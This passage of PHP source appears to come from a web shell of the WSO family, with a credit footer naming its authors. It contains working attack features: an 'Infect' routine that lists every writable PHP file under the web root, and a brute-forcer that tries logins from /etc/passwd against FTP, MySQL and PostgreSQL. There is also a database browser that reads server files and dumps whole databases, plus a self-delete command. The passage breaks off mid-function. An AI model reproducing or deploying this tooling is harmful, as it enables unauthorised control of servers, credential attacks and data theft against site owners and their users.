154px #fff,1782px 764px #fff,439px 1156px #fff,1704px 2082px #fff,1572px 1357px #fff,816px 442px #fff,1548px 2291px #fff,1261px 476px #fff,2039px 2543px #fff,1674px 975px #fff,982px 2192px #fff,1803px 876px #fff,138px 305px #fff,1677px 780px #fff,1471px 514px #fff,476px 486px #fff,1519px 1811px #fff,2144px 2510px #fff,2533px 1501px #fff,374px 142px #fff,953px 821px #fff,2092px 1729px #fff,556px 1570px #fff,2497px 846px #fff,1035px 1933px #fff,2316px 275px #fff,1313px 2153px #fff,1402px 2456px #fff,664px 2553px #fff,983px 156px #fff,423px 1307px #fff,1794px 310px #fff,255px 694px #fff,2051px 1630px #fff,1548px 2195px #fff,606px 2187px #fff,1892px 1863px #fff,1889px 1706px #fff,2277px 1815px #fff,1138px 2039px #fff,1662px 978px #fff,1490px 213px #fff,1061px 1863px #fff,2152px 285px #fff,2220px 230px #fff,666px 2259px #fff,14px 2033px #fff,1935px 1287px #fff,1259px 1796px #fff,2465px 2519px #fff,923px 1264px #fff,141px 623px #fff,1056px 1951px #fff,1924px 639px #fff,1658px 1692px #fff,2369px 910px #fff,58px 2029px #fff,1037px 1441px #fff,106px 1194px #fff,2007px 1250px #fff,1320px 243px #fff,2546px 1833px #fff,2359px 1058px #fff,2037px 1707px #fff,2458px 63px #fff,921px 553px #fff,2479px 1413px #fff,1849px 2225px #fff,2153px 302px #fff,992px 1339px #fff,1515px 1626px #fff,832px 350px #fff,898px 2454px #fff,2108px 1505px #fff,1061px 751px #fff,1875px 826px #fff,2232px 1160px #fff,1293px 759px #fff,2133px 1582px #fff,1962px 524px #fff,1695px 2209px #fff,738px 2308px #fff,1506px 1747px #fff,2300px 2215px #fff,1604px 1811px #fff,754px 2093px #fff,2525px 2253px #fff,2277px 662px #fff,1416px 2086px #fff,341px 1195px #fff,199px 913px #fff,386px 165px #fff,787px 251px #fff,2500px 547px #fff,1045px 569px #fff,2536px 788px #fff,1776px 1938px #fff,472px 2415px #fff,1440px 850px #fff,1354px 1018px #fff,1735px 949px #fff,2263px 1245px #fff,41px 359px #fff,882px 669px #fff,139px 977px #fff,146px 1861px #fff,2416px 1086px #fff,1082px 1831px #fff,1966px 2385px #fff,1397px 268px #fff,1331px 90px #fff,29px 821px #fff,1879px 2243px #fff,1508px 848px #fff,2367px 236px #fff,1476px 5px #fff,683px 2173px #fff,470px 767px #fff,2266px 2342px #fff,10px 1055px #fff,1660px 1546px #fff,1774px 1354px #fff,1505px 569px #fff,1405px 1015px #fff,720px 120px #fff,1137px 457px #fff,2504px 1110px #fff,2281px 2517px #fff,2156px 786px #fff,410px 2519px #fff,580px 1531px #fff,654px 1924px #fff,2219px 1660px #fff,269px 1761px #fff,1635px 2374px #fff,2297px 1343px #fff,880px 2262px #fff,773px 1936px #fff,724px 250px #fff,1859px 1694px #fff,466px 628px #fff,625px 1px #fff,1682px 897px #fff,683px 362px #fff,1878px 1874px #fff,2344px 1682px #fff,2187px 424px #fff,1336px 741px #fff,2408px 1519px #fff,1510px 519px #fff,16px 409px #fff,825px 1868px #fff,617px 94px #fff,879px 928px #fff,162px 2029px #fff,1322px 2272px #fff,1159px 1152px #fff,2547px 2225px #fff,2381px 2099px #fff,2204px 291px #fff,1981px 274px #fff,949px 1440px #fff,2430px 1336px #fff,418px 467px #fff,1654px 339px #fff,715px 2017px #fff,1869px 1773px #fff,2058px 169px #fff,1558px 1667px #fff,1619px 2536px #fff,398px 1719px #fff,402px 1186px #fff,361px 2285px #fff,1805px 132px #fff,2132px 1872px #fff,2129px 498px #fff,2453px 97px #fff,2555px 1529px #fff,1210px 364px #fff,232px 856px #fff,1560px 47px #fff,679px 679px #fff,1135px 1587px #fff,2331px 577px #fff,1014px 634px #fff,1244px 368px #fff,684px 1975px #fff,964px 338px #fff,1132px 747px #fff,1159px 834px #fff,778px 1533px #fff,171px 76px #fff,129px 1512px #fff,1609px 1469px #fff,1651px 1691px #fff,1736px 1020px #fff,658px 2197px #fff,134px 1044px #fff,2063px 2010px #fff,884px 656px #fff,2007px 1056px #fff,766px 971px #fff,1440px 784px #fff,27px 403px #fff,2022px 269px #fff,865px 1852px #fff,1606px 593px #fff,1309px 2403px #fff,139px 2499px #fff,2310px 1424px #fff,1488px 2192px #fff,777px 854px #fff,1389px 1576px #fff,1777px 1387px #fff,873px 1419px #fff,79px 2382px #fff,1377px 2236px #fff,2300px 1444px #fff,1239px 92px #fff,1972px 2369px #fff,22px 1465px #fff,2166px 1121px #fff,2085px 2520px #fff,823px 741px #fff,2130px 2166px #fff,518px 843px #fff,2234px 2033px #fff,278px 2097px #fff,1640px 2037px #fff,1746px 2475px #fff,2463px 2544px #fff,334px 2324px #fff,897px 129px #fff,1251px 1037px #fff,2412px 1252px #fff,2100px 1257px #fff,1079px 2466px #fff,2101px 44px #fff,2096px 1200px #fff,1950px 1643px #fff,1068px 2439px #fff,105px 2450px #fff,1577px 620px #fff,477px 103px #fff,786px 2500px #fff,468px 2106px #fff,1390px 2125px #fff,2151px 615px #fff,1010px 1567px #fff,2546px 1454px #fff,37px 768px #fff,258px 1347px #fff,686px 1713px #fff,536px 139px #fff,1496px 2463px #fff,2558px 1207px #fff,551px 1118px #fff,394px 1485px #fff,905px 2103px #fff,710px 1191px #fff,1036px 1230px #fff,521px 597px #fff,2280px 846px #fff,469px 802px #fff,283px 1574px #fff,1069px 374px #fff,697px 1498px #fff,1883px 442px #fff,1327px 2415px #fff,2350px 320px #fff,805px 162px #fff,1248px 1338px #fff,2229px 1925px #fff,1161px 596px #fff,2127px 263px #fff,460px 1408px #fff,2003px 506px #fff,348px 2079px #fff,1276px 2190px #fff,630px 184px #fff,152px 404px #fff,1383px 610px #fff,340px 2403px #fff,1852px 2473px #fff,1445px 2201px #fff,2403px 593px #fff,2533px 2049px #fff,714px 65px #fff,1706px 1807px #fff,1754px 1070px #fff,2136px 1239px #fff,917px 1417px #fff,2496px 1920px #fff,507px 735px #fff,355px 1119px #fff,534px 1746px #fff,788px 249px #fff,2374px 2496px #fff,758px 2540px #fff,1156px 951px #fff,451px 1828px #fff,1897px 1963px #fff,2313px 1409px #fff,280px 1633px #fff,2079px 1167px #fff,1566px 1476px #fff,2338px 1608px #fff,1033px 2333px #fff,708px 208px #fff,944px 1063px #fff,943px 2422px #fff,1994px 2380px #fff,1397px 1915px #fff,1757px 970px #fff,2466px 1831px #fff,1589px 458px #fff,985px 98px #fff,586px 998px #fff,2450px 1900px #fff,1277px 2137px #fff,1341px 1381px #fff,18px 165px #fff,1617px 1121px #fff,43px 1214px #fff,90px 2094px #fff,2049px 176px #fff,683px 2074px #fff,644px 2186px #fff,974px 2557px #fff,1960px 1561px #fff,2460px 1573px #fff,275px 1667px #fff,1869px 21px #fff,1755px 1793px #fff,1856px 8px #fff,246px 143px #fff,970px 1973px #fff,2164px 157px #fff,2534px 2033px #fff,419px 934px #fff,202px 586px #fff,2408px 2303px #fff,1937px 1281px #fff,864px 347px #fff,944px 1975px #fff,438px 1788px #fff,1862px 181px #fff,1922px 211px #fff,1405px 645px #fff,43px 2405px #fff,1105px 1476px #fff,2046px 947px #fff,2526px 178px #fff,561px 1320px #fff,1976px 635px #fff,2469px 1377px #fff,1969px 200px #fff,1646px 1501px #fff,524px 1325px #fff,1249px 975px #fff,1928px 1550px #fff,1876px 208px #fff,2332px 2315px #fff,20px 2409px #fff,1537px 1259px #fff,106px 1811px #fff,354px 2333px #fff,493px 2411px #fff,1750px 1661px #fff,1489px 2165px #fff,2018px 1744px #fff,2444px 1276px #fff,2409px 913px #fff,134px 1194px #fff,1022px 218px #fff,2522px 1409px #fff,376px 1306px #fff,2376px 1445px #fff,1323px 2260px #fff,2427px 268px #fff,662px 157px #fff,1346px 704px #fff,1432px 954px #fff,1060px 526px #fff,2006px 404px #fff,449px 400px #fff,319px 1740px #fff,1973px 1844px #fff,2486px 1027px #fff,1034px 1109px #fff,1644px 1932px #fff,2215px 1686px #fff,464px 2459px #fff,958px 2437px #fff,1029px 857px #fff,1993px 295px #fff,2027px 319px #fff,587px 1754px #fff,1756px 1802px #fff,257px 1434px #fff,1955px 618px #fff,8px 613px #fff,1182px 724px #fff,1923px 1177px #fff,353px 233px #fff,2271px 653px #fff,513px 1161px #fff,2229px 682px #fff,754px 354px #fff,2108px 505px #fff,1189px 1549px #fff,596px 1721px #fff,501px 560px #fff,2531px 1722px #fff,1320px 2369px #fff,44px 2000px #fff,1882px 516px #fff,325px 348px #fff,1946px 815px #fff,1374px 907px #fff,1935px 2435px #fff,629px 358px #fff,1458px 622px #fff,7px 915px #fff,1881px 358px #fff,332px 271px #fff,2357px 2393px #fff,515px 2318px #fff}.stars2{z-index:10;width:3px;height:3px;border-radius:50%;background:0 0;box-shadow:324px 1595px #fff,1456px 2475px #fff,1027px 1706px #fff,1724px 824px #fff,473px 1875px #fff,552px 110px #fff,2026px 1315px #fff,1952px 2497px #fff,2334px 1182px #fff,414px 313px #fff,707px 1672px #fff,2116px 1876px #fff,2266px 33px #fff,1266px 2472px #fff,1315px 86px #fff,2039px 154px #fff,469px 181px #fff,1126px 2244px #fff,2077px 1149px #fff,1218px 1371px #fff,1420px 2560px #fff,1580px 1356px #fff,1753px 1332px #fff,1067px 626px #fff,746px 2280px #fff,170px 1750px #fff,1724px 263px #fff,1196px 321px #fff,471px 2059px #fff,2527px 993px #fff,2071px 370px #fff,1122px 439px #fff,1655px 2187px #fff,470px 2381px #fff,1925px 510px #fff,2417px 1576px #fff,2214px 1740px #fff,104px 78px #fff,870px 2423px #fff,1520px 247px #fff,1028px 958px #fff,2155px 2556px #fff,2365px 1724px #fff,1315px 2508px #fff,657px 1884px #fff,2384px 2047px #fff,1362px 2237px #fff,1493px 944px #fff,524px 2145px #fff,1261px 2359px #fff,260px 2029px #fff,2464px 2026px #fff,1791px 1767px #fff,2142px 2047px #fff,1943px 519px #fff,602px 342px #fff,1122px 1890px #fff,1884px 702px #fff,2103px 864px #fff,1442px 859px #fff,1842px 2420px #fff,2133px 596px #fff,1431px 527px #fff,446px 2244px #fff,1509px 670px #fff,131px 1892px #fff,2060px 2093px #fff,2011px 1415px #fff,1371px 632px #fff,744px 648px #fff,2058px 2012px #fff,1975px 703px #fff,2213px 1499px #fff,889px 2122px #fff,1220px 1717px #fff,1476px 2231px #fff,2072px 1424px #fff,2518px 1263px #fff,2373px 1783px #fff,1655px 2304px #fff,2532px 1454px #fff,825px 1659px #fff,1928px 2047px #fff,922px 896px #fff,2088px 694px #fff,2434px 2559px #fff,1953px 1865px #fff,1255px 2450px #fff,1083px 546px #fff,549px 1232px #fff,2071px 522px #fff,2198px 1063px #fff,251px 2501px #fff,1263px 2376px #fff,1118px 1165px #fff,2353px 1668px #fff,1911px 1115px #fff,1288px 1090px #fff,9px 922px #fff,1096px 358px #fff,15px 601px #fff,541px 2020px #fff,485px 2429px #fff,1382px 1414px #fff,765px 559px #fff,1003px 802px #fff,649px 2478px #fff,2122px 2554px #fff,1369px 189px #fff,2553px 1024px #fff,880px 2183px #fff,1699px 189px #fff,362px 2313px #fff,1544px 161px #fff,1260px 326px #fff,1716px 1946px #fff,1824px 87px #fff,1099px 808px #fff,1394px 171px #fff,416px 1383px #fff,1159px 2021px #fff,924px 1293px #fff,1957px 68px #fff,2088px 2115px #fff,1739px 749px #fff,1447px 348px #fff,2305px 1760px #fff,2230px 4px #fff,1372px 2264px #fff,1026px 1305px #fff,65px 1213px #fff,1034px 2079px #fff,188px 676px #fff,1520px 2355px #fff,1420px 1087px #fff,620px 728px #fff,2338px 2356px #fff,956px 1020px #fff,970px 10px #fff,1801px 2495px #fff,363px 1790px #fff,239px 1814px #fff,2161px 1494px #fff,2304px 2004px #fff,1980px 156px #fff,966px 2228px #fff,1569px 1436px #fff,1431px 1731px #fff,1899px 1973px #fff,737px 1413px #fff,1045px 924px #fff,2172px 1395px #fff,1040px 1957px #fff,254px 182px #fff,1591px 1299px #fff,1440px 831px #fff,1778px 1896px #fff,332px 555px #fff,961px 1708px #fff,1976px 229px #fff,1091px 930px #fff,312px 1344px #fff,103px 1296px #fff,2066px 1762px #fff,2038px 335px #fff,1518px 1778px #fff,875px 748px #fff,390px 260px #fff,273px 2470px #fff,2107px 2401px #fff,1649px 689px #fff,1887px 2160px #fff,877px 1372px #fff,951px 792px #fff,1496px 145px #fff,951px 2012px #fff,399px 1852px #fff,1496px 2468px #fff,1671px 1063px #fff,1117px 355px #fff,192px 1059px #fff,547px 1833px #fff,921px 122px #fff,1212px 1138px #fff,1122px 2300px #fff,1109px 185px #fff,1352px 1998px #fff,1152px 138px #fff,2021px 641px #fff,897px 1308px #fff,2251px 2372px #fff,2500px 2418px #fff,642px 632px #fff,2499px 2281px #fff,850px 43px #fff,448px 2189px #fff,2400px 548px #fff,614px 1466px #fff,1365px 340px #fff,1848px 486px #fff;animation:animStar 175s linear infinite}.stars2:after{content:' ';top:-600px;width:3px;height:3px;border-radius:50%;position:absolute;backgroud:transparent;box-shadow:75px 893px #fff,2153px 2551px #fff,2555px 122px #fff,362px 1888px #fff,419px 26px #fff,1007px 595px #fff,745px 948px #fff,685px 669px #fff,876px 1369px #fff,1422px 1817px #fff,820px 1180px #fff,2196px 767px #fff,999px 575px #fff,1625px 1345px #fff,188px 892px #fff,1899px 670px #fff,1143px 871px #fff,1934px 1560px #fff,1523px 1143px #fff,1054px 2391px #fff,170px 1482px #fff,52px 744px #fff,1130px 1335px #fff,384px 638px #fff,531px 2468px #fff,2404px 2084px #fff,1180px 2507px #fff,398px 580px #fff,328px 2131px #fff,1106px 1448px #fff,1275px 2393px #fff,1304px 2454px #fff,2556px 210px #fff,312px 1720px #fff,316px 1816px #fff,1594px 980px #fff,562px 196px #fff,10px 2027px #fff,784px 748px #fff,1121px 1801px #fff,169px 1627px #fff,457px 367px #fff,2549px 2425px #fff,1610px 2161px #fff,1632px 1411px #fff,440px 1144px #fff,2244px 171px #fff,185px 591px #fff,1567px 1514px #fff,1299px 2238px #fff,112px 976px #fff,1796px 371px #fff,1785px 1944px #fff,2113px 1012px #fff,2432px 488px #fff,868px 1026px #fff,720px 2424px #fff,2366px 1258px #fff,320px 1093px #fff,583px 231px #fff,1173px 663px #fff,1200px 1193px #fff,377px 722px #fff,2388px 599px #fff,998px 2057px #fff,274px 883px #fff,869px 70px #fff,2439px 1017px #fff,1117px 616px #fff,1619px 310px #fff,583px 2007px #fff,2256px 2043px #fff,1215px 902px #fff,27px 1055px #fff,1649px 2381px #fff,2427px 1010px #fff,2135px 902px #fff,1619px 1153px #fff,1437px 1099px #fff,928px 1831px #fff,226px 2472px #fff,716px 2360px #fff,973px 827px #fff,63px 2490px #fff,1201px 1427px #fff,2190px 2161px #fff,720px 316px #fff,1498px 1803px #fff,191px 1073px #fff,34px 957px #fff,1665px 1806px #fff,1109px 1928px #fff,2248px 605px #fff,1940px 2244px #fff,2003px 488px #fff,1433px 346px #fff,1647px 676px #fff,360px 1085px #fff,1882px 1957px #fff,2252px 1733px #fff,1463px 1822px #fff,1184px 736px #fff,1873px 2188px #fff,2327px 552px #fff,1140px 243px #fff,1222px 589px #fff,1552px 340px #fff,504px 1515px #fff,2475px 941px #fff,31px 77px #fff,1097px 886px #fff,2230px 1876px #fff,1253px 375px #fff,644px 916px #fff,2394px 137px #fff,716px 107px #fff,2348px 1217px #fff,1959px 2277px #fff,406px 499px #fff,2334px 1501px #fff,1228px 2523px #fff,1123px 1778px #fff,1646px 467px #fff,1541px 257px #fff,1965px 2159px #fff,1103px 618px #fff,1561px 1990px #fff,641px 826px #fff,592px 1249px #fff,2445px 2506px #fff,1482px 1278px #fff,2465px 2027px #fff,1319px 3px #fff,1999px 1846px #fff,582px 132px #fff,2328px 928px #fff,2060px 1423px #fff,1036px 64px #fff,958px 2138px #fff,1719px 1268px #fff,993px 2138px #fff,2143px 1468px #fff,669px 2558px #fff,29px 1596px #fff,666px 1796px #fff,1262px 1620px #fff,936px 2097px #fff,1523px 2117px #fff,2417px 2002px #fff,1757px 698px #fff,2097px 586px #fff,1272px 2258px #fff,360px 662px #fff,1771px 465px #fff,2553px 1596px #fff,1595px 830px #fff,2282px 1478px #fff,1060px 30px #fff,2022px 2234px #fff,2252px 296px #fff,2035px 1538px #fff,1270px 2235px #fff,2001px 2189px #fff,2229px 1096px #fff,256px 1219px #fff,120px 102px #fff,1513px 1655px #fff,2512px 725px #fff,6px 807px #fff,1753px 1989px #fff,2242px 815px #fff,441px 2504px #fff,911px 68px #fff,2457px 1412px #fff,1595px 184px #fff,20px 937px #fff,2288px 1384px #fff,295px 717px #fff,711px 1144px #fff,1237px 2043px #fff,1118px 1258px #fff,15px 965px #fff,458px 523px #fff,1175px 1076px #fff,1795px 203px #fff,1293px 1231px #fff,409px 1785px #fff,2501px 806px #fff,2252px 1253px #fff,1810px 53px #fff,9px 1967px #fff,1327px 1083px #fff,2187px 1323px #fff,1751px 1345px #fff,412px 767px #fff,1796px 1004px #fff,707px 1856px #fff,1468px 836px #fff,2526px 1390px #fff,679px 1248px #fff}.shooting-stars{z-index:10;width:5px;height:85px;border-top-left-radius:50%;border-top-right-radius:50%;position:absolute;bottom:0;right:0;background:linear-gradient(to top,rgba(255,255,255,0),#fff);animation:animShootingStar 10s linear infinite}@keyframes animStar{from{transform:translateY(0)}to{transform:translateY(-2560px) translateX(-2560px)}}@keyframes animShootingStar{from{transform:translateY(0) translateX(0) rotate(-45deg);opacity:1;height:5px}to{transform:translateY(-2560px) translateX(-2560px) rotate(-45deg);opacity:1;height:800px}}</style>

<footer id='det' style='position:fixed; left:0px; right:0px; bottom:0px; background:rgb(0,0,0); text-align:center; border-top: 1px solid #ff007e; border-bottom: 1px solid #ff007e'><font face='Century Gothic' color='#ff0048' size='5'><font style='font-size: 10pt' face='Century Gothic'><font face='Tahoma' color='#005aff' size='2.5'><font color='#ff007e'><b> ©opy®ight : </b></font>
<marquee scrollamount='3' scrolldelay='60' width='80%'><b>Twepl & <a href='https://github.com/Ghostboy-287'>Ghostboy Twoeightseven</a> </b></marquee>  </font></font></font></footer>");
}
function actionSelfRemove() {
	if($_POST['p1'] == 'yes')
		if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('Shell has been removed');
		else
			echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        hardHeader();
	echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
	hardFooter();
}
function actionInfect() {
	hardHeader();
	echo '<h1>Infect</h1><div class=content>';
	if($_POST['p1'] == 'infect') {
		$target=$_SERVER['DOCUMENT_ROOT'];
			function ListFiles($dir) {
				if($dh = opendir($dir)) {
					$files = Array();
					$inner_files = Array();
					while($file = readdir($dh)) {
						if($file != "." && $file != "..") {
							if(is_dir($dir . "/" . $file)) {
								$inner_files = ListFiles($dir . "/" . $file);
								if(is_array($inner_files)) $files = array_merge($files, $inner_files);
							} else {
								array_push($files, $dir . "/" . $file);
							}
						}
					}
					closedir($dh);
					return $files;
				}
			}
			foreach (ListFiles($target) as $key=>$file){
				$nFile = substr($file, -4, 4);
				if($nFile == ".php" ){
					if(($file<>$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'])&&(is_writeable($file))){
						echo "$file<br>";
						$i++;
					}
				}
			}
			echo "<font color=red size=14>$i</font>";
		}else{
			echo "<form method=post><input type=submit value=Infect name=infet></form>";
			echo 'Really want to infect the server?&nbsp;<a href=# onclick="g(null,null,\'infect\')">Yes</a></div>';
		}
	hardFooter();
}
function actionBruteforce() {
	hardHeader();
	if( isset($_POST['proto']) ) {
		echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '.htmlspecialchars($_POST['server']).'<br>';
		if( $_POST['proto'] == 'ftp' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$fp = @ftp_connect($ip, $port?$port:21);
				if(!$fp) return false;
				$res = @ftp_login($fp, $login, $pass);
				@ftp_close($fp);
				return $res;
			}
		} elseif( $_POST['proto'] == 'mysql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$res = @mysql_connect($ip.':'.($port?$port:3306), $login, $pass);
				@mysql_close($res);
				return $res;
			}
		} elseif( $_POST['proto'] == 'pgsql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres";
				$res = @pg_connect($str);
				@pg_close($res);
				return $res;
			}
		}
		$success = 0;
		$attempts = 0;
		$server = explode(":", $_POST['server']);
		if($_POST['type'] == 1) {
			$temp = @file('/etc/passwd');
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = explode(":", $line);
					++$attempts;
					if( bruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
						$success++;
						echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';
					}
					if(@$_POST['reverse']) {
						$tmp = "";
						for($i=strlen($line[0])-1; $i>=0; --$i)
							$tmp .= $line[0][$i];
						++$attempts;
						if( bruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
							$success++;
							echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);
						}
					}
				}
		} elseif($_POST['type'] == 2) {
			$temp = @file($_POST['dict']);
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = trim($line);
					++$attempts;
					if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
						$success++;
						echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>';
					}
				}
		}
		echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
	}
	echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>'
		.'<td><label><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></label></td></tr><tr><td>'
		.'<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">'
		.'<input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'">'
		.'<input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'">'
		.'<input type=hidden name=ne  value="">'
		.'<span>Server:port</span></td>'
		.'<td><input type=text name=server value="127.0.0.1"></td></tr>'
		.'<tr><td><span>Brute type</span></td>'
		.'<td><input type=radio name=type value="1" checked> /etc/passwd</td></tr>'
		.'<tr><td></td><td style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</td></tr>'
		.'<tr><td></td><td><input type=radio name=type value="2"> Dictionary</td></tr>'
		.'<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>'
		.'<td><input type=text name=login value="root"></td></tr>'
		.'<tr><td><span>Dictionary</span></td>'
		.'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>'
		.'</td></tr><tr><td></td><td><input type=submit value="submit"></td></tr></form></table>';
	echo '</div>';
	hardFooter();
}
function actionSql() {
	class DbClass {
		var $type;
		var $link;
		var $res;
		function DbClass($type)	{
			$this->type = $type;
		}
		function connect($host, $user, $pass, $dbname){
			switch($this->type)	{
				case 'mysql':
					if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
					break;
				case 'pgsql':
					$host = explode(':', $host);
					if(!$host[1]) $host[1]=5432;
					if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
					break;
			}
			return false;
		}
		function selectdb($db) {
			switch($this->type)	{
				case 'mysql':
					if (@mysql_select_db($db))return true;
					break;
			}
			return false;
		}
		function query($str) {
			switch($this->type) {
				case 'mysql':
					return $this->res = @mysql_query($str);
					break;
				case 'pgsql':
					return $this->res = @pg_query($this->link,$str);
					break;
			}
			return false;
		}
		function fetch() {
			$res = func_num_args()?func_get_arg(0):$this->res;
			switch($this->type)	{
				case 'mysql':
					return @mysql_fetch_assoc($res);
					break;
				case 'pgsql':
					return @pg_fetch_assoc($res);
					break;
			}
			return false;
		}
		function listDbs() {
			switch($this->type)	{
				case 'mysql':
                        return $this->query("SHOW databases");
				break;
				case 'pgsql':
					return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
				break;
			}
			return false;
		}
		function listTables() {
			switch($this->type)	{
				case 'mysql':
					return $this->res = $this->query('SHOW TABLES');
				break;
				case 'pgsql':
					return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
				break;
			}
			return false;
		}
		function error() {
			switch($this->type)	{
				case 'mysql':
					return @mysql_error();
				break;
				case 'pgsql':
					return @pg_last_error();
				break;
			}
			return false;
		}
		function setCharset($str) {
			switch($this->type)	{
				case 'mysql':
					if(function_exists('mysql_set_charset'))
						return @mysql_set_charset($str, $this->link);
					else
						$this->query('SET CHARSET '.$str);
					break;
				case 'pgsql':
					return @pg_set_client_encoding($this->link, $str);
					break;
			}
			return false;
		}
		function loadFile($str) {
			switch($this->type)	{
				case 'mysql':
					return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
				break;
				case 'pgsql':
					$this->query("CREATE TABLE hard2(file text);COPY hard2 FROM '".addslashes($str)."';select file from hard2;");
					$r=array();
					while($i=$this->fetch())
						$r[] = $i['file'];
					$this->query('drop table hard2');
					return array('file'=>implode("\n",$r));
				break;
			}
			return false;
		}
		function dump($table, $fp = false) {
			switch($this->type)	{
				case 'mysql':
					$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
					$create = mysql_fetch_array($res);
					$sql = $create[1].";\n";
                    if($fp) fwrite($fp, $sql); else echo($sql);
					$this->query('SELECT * FROM `'.$table.'`');
                    $i = 0;
                    $head = true;
					while($▟ = $this->fetch()) {
                        $sql = '';
                        if($i % 1000 == 0) {
                            $head = true;
                            $sql = ";\n\n";
                        }
						$columns = array();
						foreach($▟ as $k=>$v) {
                            if($v === null)
                                $▟[$k] = "NULL";
                            elseif(is_int($v))
                                $▟[$k] = $v;
                            else
                                $▟[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
                        if($head) {
                            $sql .= 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $▟).')';
                            $head = false;
                        } else
                            $sql .= "\n\t,(".implode(", ", $▟).')';
                        if($fp) fwrite($fp, $sql); else echo($sql);
                        $i++;
					}
                    if(!$head)
                        if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
				break;
				case 'pgsql':
					$this->query('SELECT * FROM '.$table);
					while($▟ = $this->fetch()) {
						$columns = array();
						foreach($▟ as $k=>$v) {
							$▟[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $▟).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
				break;
			}
			return false;
		}
	};
	$db = new DbClass($_POST['type']);
	if((@$_POST['p2']=='download') && (@$_POST['p1']!='select')) {
		$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
		$db->selectdb($_POST['sql_base']);
        switch($_POST['charset']) {
            case "Windows-1251": $db->setCharset('cp1251'); break;
            case "UTF-8": $db->setCharset('utf8'); break;
            case "KOI8-R": $db->setCharset('koi8r'); break;
            case "KOI8-U": $db->setCharset('koi8u'); break;
            case "cp866": $db->setCharset('cp866'); break;
        }
        if(empty($_POST['file'])) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=dump.sql");
            header("Content-Type: text/plain");
            foreach($_POST['tbl'] as $v)
				$db->dump($v);
            exit;
        } elseif($fp = @fopen($_POST['file'], 'w')) {
            foreach($_POST['tbl'] as $v)
                $db->dump($v, $fp);
            fclose($fp);
            unset($_POST['p2']);
        } else
            die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
	}
	hardHeader();
	echo "
<h1>Sql browser</h1><div class=content>
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
<input type=hidden name=ne value=''><input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'>
<td><label><select name='type'><option value='mysql' ";
    if(@$_POST['type']=='mysql')echo 'selected';
echo ">MySql</option><option value='pgsql' ";
if(@$_POST['type']=='pgsql')echo 'selected';
echo ">PostgreSql</option></select></label></td>
<td><input type=text name=sql_host value=\"". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."\"></td>
<td><input type=text name=sql_login value=\"". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."\"></td>
<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\" required></td><td>";
	$tmp = "<input type=text name=sql_base value=''>";
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			switch($_POST['charset']) {
				case "Windows-1251": $db->setCharset('cp1251'); break;
				case "UTF-8": $db->setCharset('utf8'); break;
				case "KOI8-R": $db->setCharset('koi8r'); break;
				case "KOI8-U": $db->setCharset('koi8u'); break;
				case "cp866": $db->setCharset('cp866'); break;
			}
			$db->listDbs();
			echo "<label><select name=sql_base><option value=''></option>";
			while($▟ = $db->fetch()) {
				list($key, $value) = each($▟);
